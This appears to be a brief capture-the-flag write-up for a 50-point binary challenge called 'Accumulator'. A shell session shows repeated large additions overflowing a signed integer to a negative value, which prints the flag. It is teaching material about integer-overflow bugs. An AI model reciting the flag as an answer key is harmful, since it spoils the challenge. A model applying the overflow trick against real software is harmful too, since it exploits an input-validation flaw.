Accumulator
binary, 50

I found this program (source) that lets me add positive numbers to a variable, but it won't give me a flag unless that variable is negative! Can you help me out? Navigate to /problems/accumulator/ on the shell server to try your exploit out!


team332540@shell:/problems/accumulator$ ./accumulator64
The accumulator currently has a value of 0.
Please enter a positive integer to add: 999999999
The accumulator currently has a value of 999999999.
Please enter a positive integer to add: 999999999
The accumulator currently has a value of 1999999998.
Please enter a positive integer to add: 999999999
The accumulator has a value of -1294967299. You win!
actf{signed_ints_aint_safe}
